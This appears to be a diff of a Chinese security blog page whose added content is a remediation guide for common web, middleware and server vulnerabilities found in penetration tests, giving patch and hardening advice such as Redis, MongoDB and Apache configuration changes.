+<h4 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h4><h5 id="修复建议-10"><a href="#修复建议-10" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、限制用户输入的CR和LF，或者对CR和LF字符正确编码后再输出。CR、LF分别对应回车（%0d）、换行（%0a）字符。</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="命令执行注入"><a href="#命令执行注入" class="headerlink" title="命令执行注入"></a>命令执行注入</h4><h5 id="修复建议-11"><a href="#修复建议-11" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、尽量避免使用exec、system、passthru、popen、shell_exec、eval、execute、assert等此类执行命令&#x2F;执行代码相关函数。</span><br><span class="line">2、执行代码&#x2F;命令的参数，或文件名，不要使用外部获取，禁止和用户输入相关，只能由开发人员定义代码内容，用户只能提交“1、2、3”参数，代表相应代码，防止用户构造。</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a>URL跳转</h4><h5 id="修复建议-12"><a href="#修复建议-12" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、避免使用重定向和转发</span><br><span class="line">2、如果使用了重定向和转发，则不要在接受目标时涉及到用户参数</span><br><span class="line">3、如果无法避免使用用户参数，则应确保其提供的值对于当前用户是有效的，并已经授权</span><br><span class="line">4、确定白名单及网络边界，限定协议以及可访问的网络</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="Json劫持"><a href="#Json劫持" class="headerlink" title="Json劫持"></a>Json劫持</h4><h5 id="修复建议-13"><a href="#修复建议-13" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token等。</span><br><span class="line">2、严格按照JSON格式标准输出 Content-Type 及编码（ Content-Type : application&#x2F;json; charset&#x3D;utf-8）。</span><br><span class="line">3、严格过滤 callback 函数名及 JSON 里数据的输出。</span><br><span class="line">4、严格限制对 JSONP 输出 callback 函数名的长度。</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="第三方组件安全"><a href="#第三方组件安全" class="headerlink" title="第三方组件安全"></a>第三方组件安全</h4><h5 id="修复建议-14"><a href="#修复建议-14" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">略，因涉及第三方组件较多，如ewebeditor、FCKeditor、ueditor等等，请根据实际情况编写修复建议。</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="本地-远程文件包含"><a href="#本地-远程文件包含" class="headerlink" title="本地/远程文件包含"></a>本地/远程文件包含</h4><h5 id="修复建议-15"><a href="#修复建议-15" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、保证参数用户不可控&#x2F;不可构造性。</span><br><span class="line">2、使用 basename() 函数处理参数。</span><br><span class="line">3、对所有的变量初始化。</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h4><h5 id="修复建议-16"><a href="#修复建议-16" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、尽量避免使用exec、system、passthru、popen、shell_exec、eval、execute、assert等此类执行命令&#x2F;执行代码相关函数。</span><br><span class="line">2、执行代码&#x2F;命令的参数，或文件名，不要使用外部获取，禁止和用户输入相关，只能由开发人员定义代码内容，用户只能提交“1、2、3”参数，代表相应代码，防止用户构造。</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="Struts2远程命令执行"><a href="#Struts2远程命令执行" class="headerlink" title="Struts2远程命令执行"></a>Struts2远程命令执行</h4><h5 id="修复建议-17"><a href="#修复建议-17" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Struts2远程命令执行漏洞涉及多个漏洞编号，如S2-005、S2-008、S2-009、S2-016、S2-020、S2-029、S2-032、S2-037、S2-045、S2-046、S2-052、S2-055等等，根据实际情况，建议升级Struts2框架至最新版本即可。如：</span><br><span class="line"></span><br><span class="line">系统存在S2-016 Struts2远程命令执行漏洞，建议升级升级Struts2框架至最新版本。</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="Spring远程命令执行"><a href="#Spring远程命令执行" class="headerlink" title="Spring远程命令执行"></a>Spring远程命令执行</h4><h5 id="修复建议-18"><a href="#修复建议-18" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">该漏洞为Spring标签EL表达式注入，CVE编号为CVE-2011-2730。</span><br><span class="line">建议升级Spring至Spring3.1以后版本，或修改web.xml配置关闭对EL表达式的支持：</span><br><span class="line">&lt;context-param&gt;  </span><br><span class="line">&lt;description&gt;Spring Expression Language Support&lt;&#x2F;description&gt;  </span><br><span class="line">&lt;param-name&gt;springJspExpressionSupport&lt;&#x2F;param-name&gt;  </span><br><span class="line">&lt;param-value&gt;false&lt;&#x2F;param-value&gt;  </span><br><span class="line">&lt;&#x2F;context-param&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="反序列化命令执行"><a href="#反序列化命令执行" class="headerlink" title="反序列化命令执行"></a>反序列化命令执行</h4><h5 id="修复建议-19"><a href="#修复建议-19" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">略，根据实际情况编写漏洞修复建议。</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="业务逻辑安全"><a href="#业务逻辑安全" class="headerlink" title="业务逻辑安全"></a>业务逻辑安全</h3><h4 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h4><h5 id="修复建议-20"><a href="#修复建议-20" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、模糊登陆错误信息，对用户名错误及密码错误均提示”用户名或密码错误，请重新输入”。</span><br><span class="line">2、用户登录后需要对初始口令进行修改，防止攻击者利用初始口令进行暴力破解。</span><br><span class="line">3、系统设置强密码策略，建议用户密码采用10位以上数字加大小写字母。</span><br><span class="line">4、对密码暴力猜解行为进行图灵验证，一旦发现用户口令破解行为及时对账户进行限时封停处理。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="用户名密码枚举"><a href="#用户名密码枚举" class="headerlink" title="用户名密码枚举"></a>用户名密码枚举</h4><h5 id="修复建议-21"><a href="#修复建议-21" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、模糊登陆错误信息，对用户名错误及密码错误均提示”用户名或密码错误，请重新输入”。</span><br><span class="line">2、用户登录后需要对初始口令进行修改，防止攻击者利用初始口令进行暴力破解。</span><br><span class="line">3、系统设置强密码策略，建议用户密码采用10位以上数字加大小写字母。</span><br><span class="line">4、对密码暴力猜解行为进行图灵验证，一旦发现用户口令破解行为及时对账户进行限时封停处理。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="用户弱口令"><a href="#用户弱口令" class="headerlink" title="用户弱口令"></a>用户弱口令</h4><h5 id="修复建议-22"><a href="#修复建议-22" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、用户登录后需要对初始口令进行修改，防止攻击者利用初始口令进行暴力破解。</span><br><span class="line">2、系统设置强密码策略，建议用户密码采用10位以上数字加大小写字母。</span><br><span class="line">3、对密码暴力猜解行为进行图灵验证，一旦发现用户口令破解行为及时对账户进行限时封停处理。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="会话标志固定攻击"><a href="#会话标志固定攻击" class="headerlink" title="会话标志固定攻击"></a>会话标志固定攻击</h4><h5 id="修复建议-23"><a href="#修复建议-23" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、用户登录成功后重新创建一个Sesssion ID，并销毁该用户之前登陆使用的Sesssion ID。</span><br><span class="line">2、限制Sesssion ID的时效性，一段时间后销毁Sesssion ID。</span><br><span class="line">3、添加其他认证因素，如User-Agent验证及Token校验等。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="平行越权访问"><a href="#平行越权访问" class="headerlink" title="平行越权访问"></a>平行越权访问</h4><h5 id="修复建议-24"><a href="#修复建议-24" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、对于每个功能的访问，需要明确授予特定角色的访问权限。</span><br><span class="line">2、如果某功能参与了工作流程，检查并确保当前的条件是授权访问此功能的合适状态。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="水平越权访问"><a href="#水平越权访问" class="headerlink" title="水平越权访问"></a>水平越权访问</h4><h5 id="修复建议-25"><a href="#修复建议-25" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、对于每个功能的访问，需要明确授予特定角色的访问权限。</span><br><span class="line">2、如果某功能参与了工作流程，检查并确保当前的条件是授权访问此功能的合适状态。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><h5 id="修复建议-26"><a href="#修复建议-26" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、对于每个功能的访问，需要明确授予特定角色的访问权限。</span><br><span class="line">2、如果某功能参与了工作流程，检查并确保当前的条件是授权访问此功能的合适状态。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="验证码缺陷"><a href="#验证码缺陷" class="headerlink" title="验证码缺陷"></a>验证码缺陷</h4><h5 id="修复建议-27"><a href="#修复建议-27" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、验证码使用一次后，立即销毁该验证码Session，防止验证码被多次使用。</span><br><span class="line">2、对验证码添加干扰线，对验证码字符随机扭曲、粘连、翻转等处理。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="中间件安全"><a href="#中间件安全" class="headerlink" title="中间件安全"></a>中间件安全</h3><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><h5 id="修复建议-28"><a href="#修复建议-28" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、关闭中间件的目录浏览功能。</span><br><span class="line">2、在每个目录新建一个index.htm文件。</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="中间件配置缺陷"><a href="#中间件配置缺陷" class="headerlink" title="中间件配置缺陷"></a>中间件配置缺陷</h4><h5 id="修复建议-29"><a href="#修复建议-29" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">略，根据实际情况编写。如</span><br><span class="line">目录遍历修复方案：</span><br><span class="line">1、关闭中间件的目录浏览功能。</span><br><span class="line">2、在每个目录新建一个index.htm文件。</span><br><span class="line">默认示例文件：</span><br><span class="line">1、在不影响系统正常的情况下，删除默认示例文件。</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="中间件弱口令"><a href="#中间件弱口令" class="headerlink" title="中间件弱口令"></a>中间件弱口令</h4><h5 id="修复建议-30"><a href="#修复建议-30" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、用户登录后需要对初始口令进行修改，防止攻击者利用初始口令进行暴力破解。</span><br><span class="line">2、系统设置强密码策略，建议用户密码采用10位以上数字加大小写字母。</span><br><span class="line">3、对密码暴力猜解行为进行图灵验证，一旦发现用户口令破解行为及时对账户进行限时封停处理。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="Weblogic反序列化命令执行"><a href="#Weblogic反序列化命令执行" class="headerlink" title="Weblogic反序列化命令执行"></a>Weblogic反序列化命令执行</h4><h5 id="修复建议-31"><a href="#修复建议-31" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、Weblogic控制台端口(默认TCP 7001)迁移至内网，不对互联网开放。</span><br><span class="line">2、Webloigc Java反序列化漏洞涉及多个CVE编号：</span><br><span class="line">CVE-2015-4852</span><br><span class="line">CVE-2016-0638</span><br><span class="line">CVE-2016-3510</span><br><span class="line">CVE-2017-3248</span><br><span class="line">CVE-2017-3506</span><br><span class="line">CVE-2017-10352等，安装相应补丁即可，或更新Weblogic至最新版。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="JBoss反序列化命令执行"><a href="#JBoss反序列化命令执行" class="headerlink" title="JBoss反序列化命令执行"></a>JBoss反序列化命令执行</h4><h5 id="修复建议-32"><a href="#修复建议-32" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、JBoss控制台端口（默认TCP 8080）迁移至内网，不对互联网开放。</span><br><span class="line">2、修改默认配置，关闭 EJB Invoker&#x2F;JMXInvokerServlet对外开放接口。</span><br><span class="line">3、升级JBoss至最新版。</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="Websphere反序列化命令执行"><a href="#Websphere反序列化命令执行" class="headerlink" title="Websphere反序列化命令执行"></a>Websphere反序列化命令执行</h4><h5 id="修复建议-33"><a href="#修复建议-33" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、Websphere端口（默认TCP 8880）迁移至内网，不对互联网开放。</span><br><span class="line">2、升级Websphere至最新版。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="Jenkins反序列化命令执行"><a href="#Jenkins反序列化命令执行" class="headerlink" title="Jenkins反序列化命令执行"></a>Jenkins反序列化命令执行</h4><h5 id="修复建议-34"><a href="#修复建议-34" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Jenkins Java反序列化漏洞涉及多个CVE编号：</span><br><span class="line">CVE-2015-4852</span><br><span class="line">CVE-2015-8103</span><br><span class="line">CVE-2016-0792</span><br><span class="line">CVE-2017-1000353</span><br><span class="line">CVE-2017-1000354</span><br><span class="line">CVE-2017-1000355</span><br><span class="line">CVE-2017-1000356等等，安装相应补丁即可，或更新Jenkins至最新版。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="文件解析代码执行"><a href="#文件解析代码执行" class="headerlink" title="文件解析代码执行"></a>文件解析代码执行</h4><h5 id="修复建议-35"><a href="#修复建议-35" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">IIS6解析漏洞修复建议：</span><br><span class="line">IIS6微软已经不在维护，建议升级IIS至IIS8或更高版本。</span><br><span class="line"></span><br><span class="line">IIS7.0&#x2F;7.5解析漏洞修复建议：</span><br><span class="line">1、修改php.ini中cgi.pathinfo为0，并重启IIS。</span><br><span class="line">2、在IIS里找到“处理程序映射”，然后对PHP这一项进行编辑，点击“请求限制”，勾选“仅当请求映射至以下内容时才调用处理程序”。</span><br><span class="line"></span><br><span class="line">Nginx解析漏洞修复建议：</span><br><span class="line">1、升级Nginx版本</span><br><span class="line">2、修改php.ini文件，将cgi.fix_pathinfo的值设置为0。完成后请重启PHP和Nginx。</span><br><span class="line"></span><br><span class="line">Apache解析漏洞修复建议：</span><br><span class="line">在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为*.php.*的访问权限：</span><br><span class="line">&lt;FilesMatch &quot;.(php.|php3.|php4.|php5.)&quot;&gt;</span><br><span class="line">Order Deny,Allow</span><br><span class="line">Deny from all</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="服务器安全"><a href="#服务器安全" class="headerlink" title="服务器安全"></a>服务器安全</h3><h4 id="域传送漏洞"><a href="#域传送漏洞" class="headerlink" title="域传送漏洞"></a>域传送漏洞</h4><h5 id="修复建议-36"><a href="#修复建议-36" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DNS区域传送（DNS zone transfer）指的是一台备用服务器使用来自主服务器的数据刷新自己的域（zone）数据库。这为运行中的DNS服务提供了一定的冗余度，其目的是为了防止主的域名服务器因意外故障变得不可用时影响到整个域名的解析。一般来说，DNS区域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供一个zone数据库的详细信息，所以说允许不受信任的因特网用户执行DNS区域传送（zone transfer）操作是后果最为严重的错误配置之一。解决域传送问题只需allow-transfer限制可以进行同步的服务器，方式有两种，限制IP或使用TSIG key认证：</span><br><span class="line"></span><br><span class="line">1、针对于bind软件，可以通过allowe-transfer指令来控制，</span><br><span class="line">可以作为global选项或者zone选项的一个参数，我们可以使用地址列表如下：</span><br><span class="line">allowe-transfer ｛192.168.1.1; 172.24.123.253;｝;</span><br><span class="line"></span><br><span class="line">2、采用TSIG key来严格定义区域传送的关系，如下</span><br><span class="line">allowe-transfer ｛key &quot;dns1-slave1&quot;; key &quot;dns1-slave2&quot;;｝;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h4><h5 id="修复建议-37"><a href="#修复建议-37" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、以低权限运行Redis服务，严禁使用root用户等高权限用户运行Redis服务</span><br><span class="line">2、为Redis添加密码验证</span><br><span class="line">修改redis.conf，添加</span><br><span class="line">requirepass mypassword</span><br><span class="line">3、禁止外网访问Redis</span><br><span class="line">修改redis.conf，添加或修改，使得Redis服务只在当前主机可用</span><br><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="MangoDB未授权访问"><a href="#MangoDB未授权访问" class="headerlink" title="MangoDB未授权访问"></a>MangoDB未授权访问</h4><h5 id="修复建议-38"><a href="#修复建议-38" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、修改默认的mongoDB端口(默认为: TCP 27017)为其他端口</span><br><span class="line">2、禁止外网访问MangoDB</span><br><span class="line">修改&#x2F;etc&#x2F;mongodb.conf，设置bind_ip</span><br><span class="line">bind_ip &#x3D; 127.0.0.1</span><br><span class="line">3、禁用HTTP和REST端口</span><br><span class="line">MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface参数：nohttpinterface &#x3D; false</span><br><span class="line">4、MongoDB授权</span><br><span class="line">在admin 数据库中创建用户，并设置强密码，修改配置文件&#x2F;etc&#x2F;mongodb.conf，开启授权：</span><br><span class="line">auth &#x3D; true</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="操作系统弱口令"><a href="#操作系统弱口令" class="headerlink" title="操作系统弱口令"></a>操作系统弱口令</h4><h5 id="修复建议-39"><a href="#修复建议-39" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、用户登录后需要对初始口令进行修改，防止攻击者利用初始口令进行暴力破解。</span><br><span class="line">2、系统设置强密码策略，建议用户密码采用10位以上数字加大小写字母。</span><br><span class="line">3、对密码暴力猜解行为进行图灵验证，一旦发现用户口令破解行为及时对账户进行限时封停处理。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="数据库弱口令"><a href="#数据库弱口令" class="headerlink" title="数据库弱口令"></a>数据库弱口令</h4><h5 id="修复建议-40"><a href="#修复建议-40" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、用户登录后需要对初始口令进行修改，防止攻击者利用初始口令进行暴力破解。</span><br><span class="line">2、系统设置强密码策略，建议用户密码采用10位以上数字加大小写字母。</span><br><span class="line">3、对密码暴力猜解行为进行图灵验证，一旦发现用户口令破解行为及时对账户进行限时封停处理。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="本地权限提升"><a href="#本地权限提升" class="headerlink" title="本地权限提升"></a>本地权限提升</h4><h5 id="修复建议-41"><a href="#修复建议-41" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">略，根据实际情况编写修复建议。如：</span><br><span class="line">更新系统补丁至XXX版本。</span><br><span class="line">更新XXX软件至XXX版本。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="已存在的脚本木马"><a href="#已存在的脚本木马" class="headerlink" title="已存在的脚本木马"></a>已存在的脚本木马</h4><h5 id="修复建议-42"><a href="#修复建议-42" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、删除后门程序、对网站目录进行后门查杀</span><br><span class="line">2、查看Web日志，进行攻击溯源</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="应用防护硬件缺陷"><a href="#应用防护硬件缺陷" class="headerlink" title="应用防护硬件缺陷"></a>应用防护硬件缺陷</h4><h5 id="修复建议-43"><a href="#修复建议-43" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">略，根据实际情况编写修复建议。</span><br></pre></td></tr></table></figure>
+
 
 
       
@@ -229,11 +431,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">exp</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">shiro反序列</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞修复</a>
         		</li>
       		
 		</ul>
@@ -249,7 +447,7 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="/categories/渗透测试/漏洞复现//" class="article-tag-list-link color5">漏洞复现</a>
+        			<a href="/categories/渗透测试/其他//" class="article-tag-list-link color3">其他</a>
         		</li>
       		
 		</ul>
@@ -304,7 +502,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/06/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-shiro%E5%8F%8D%E5%BA%8F%E5%88%97/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2021/05/29/test1/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -318,18 +516,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/06/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20ActiveMQ/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          ActiveMQ 漏洞复现
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/05/29/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E9%80%9A%E7%94%A8%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">渗透测试常见漏洞通用修复方法</div>
+    <a href="/2021/03/19/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-test/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">test</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -360,8 +549,8 @@
   <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
 <script>
   var cloudTieConfig = {
-    url: "http://yoursite.com/2020/06/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-shiro%E5%8F%8D%E5%BA%8F%E5%88%97/", 
-    sourceId: "漏洞复现-shiro反序列",
+    url: "http://yoursite.com/2021/05/29/test1/", 
+    sourceId: "test1",
     productKey: "true",
     target: "cloud-tie-wrapper"
   };
